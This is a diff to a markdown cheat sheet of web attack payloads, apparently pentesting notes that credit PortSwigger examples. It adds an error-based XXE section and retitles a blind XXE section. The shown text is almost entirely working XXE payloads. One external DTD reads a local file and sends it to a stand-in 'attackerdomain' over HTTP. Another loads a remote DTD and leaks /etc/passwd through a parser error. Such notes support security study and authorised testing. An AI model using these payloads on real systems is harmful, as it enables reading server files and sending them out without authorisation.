@@ -517,7 +517,7 @@ More examples
 		</admin>
 ```
 
-Blind XXE (Examples taken from portswigger)
+### Blind XXE (Examples taken from portswigger)
 ```
 Testing for blind XXE:
 
@@ -543,6 +543,27 @@ exploit.dtd
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attackerdomain/?x=%file;'>">
 %eval;
 %exfil;
+```
+
+### Error-based XXE
+
+```
+XXE Payload
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE message [
+    <!ENTITY % ext SYSTEM "https://attackerdomain/exploit.dtd">
+    %ext;
+]>
+<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+
+
+external dtd file
+
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
 ```
 
 ### xss via file upload
